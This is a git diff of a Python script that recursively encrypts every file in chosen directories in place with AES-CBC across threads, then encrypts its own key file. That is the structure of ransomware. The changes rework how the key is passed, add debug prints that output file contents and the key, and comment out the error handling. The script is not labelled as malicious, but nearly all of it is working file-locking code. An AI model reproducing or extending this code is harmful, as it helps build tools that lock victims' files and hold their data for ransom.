@@ -16,12 +16,18 @@ MAX_THREADS = int(os.getenv("MAX_THREADS"))
 
 
 class FileEncryptor:
+    def __init__(self, key):
+        self.key = key
+
     # Encrypting the file
     def encrypt_file(self, file_path) -> None:
         with open(file_path, "rb") as f:
             data = f.read() 
 
-        cipher = AES.new(key, AES.MODE_CBC)
+        print(data)
+        print(self.key)
+
+        cipher = AES.new(self.key, AES.MODE_CBC)
         ciphered_data = cipher.encrypt(pad(data, AES.block_size))
 
         with open(file_path, "wb") as f:
@@ -34,15 +40,16 @@ class FileEncryptor:
             iv = f.read(16) # Initialization vector
             data = f.read()
 
-        cipher = AES.new(key, AES.MODE_CBC, iv)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
         deciphered_data = unpad(cipher.decrypt(data), AES.block_size)
 
         with open(file_path, "wb") as f:
             f.write(deciphered_data)
 
 class DirectoryEncryptor(FileEncryptor):
-    def __init__(self):
-        threads = []
+    def __init__(self, key):
+        super().__init__(key)
+        threads: list[threading.Thread] = []
 
     # Encrypting/Decrypting the directory
     def crypt_dir(self, directory, mode: str) -> None:
@@ -56,7 +63,7 @@ class DirectoryEncryptor(FileEncryptor):
                     self.crypt_dir(entry.path, mode)
 
     def crypt_all_dirs(self, mode: str) -> None:
-            threads = self.threads
+            threads = []
             #[crypt_dir(target_dir_path, mode) for target_dir_path in target_dir_paths]
             #! FILES IN THE ROOT DIRECTORY ARE NOT ENCRYPTED
             for directory in target_dir_paths:
@@ -79,29 +86,27 @@ class DirectoryEncryptor(FileEncryptor):
 
 
 def main():
-    def load_key():
+    def load_key() -> str:
         with open(KEY_PATH, "rb") as f:
             sym_key = f.read()
         return sym_key
 
-    directoryEncryptor = DirectoryEncryptor()
-
-    try:
-        if sys.argv[1] == "encrypt":
-            key = load_key()
-            directoryEncryptor.crypt_all_dirs("encrypt")
-            encrypt_key(KEY_PATH)
-        else:
-            decrypt_key(KEY_PATH)
-            key = load_key()
-            directoryEncryptor.crypt_all_dirs("decrypt")
-    except FileNotFoundError:
+    #try:
+    if sys.argv[1] == "encrypt":
+        key = load_key()
+        DirectoryEncryptor(key).crypt_all_dirs("encrypt")
+        encrypt_key(KEY_PATH)
+    else:
+        decrypt_key(KEY_PATH)
+        key = load_key()
+        DirectoryEncryptor(key).crypt_all_dirs("decrypt")
+    """except FileNotFoundError:
         print("Could not find a key.")
     except ValueError:
-        print("Files are encrypted or incorrect decryption.")
+        print("Files are encrypted or incorrect decryption.")"""
 
 if __name__ == "__main__":
-    target_dir_paths = os.getenv("TARGET_DIR_PATHS").split(", ")
+    target_dir_paths: list[str] = os.getenv("TARGET_DIR_PATHS").split(", ")
     if len(target_dir_paths) == 0:
         print("No directories to encrypt or decrypt.")
         sys.exit(0)
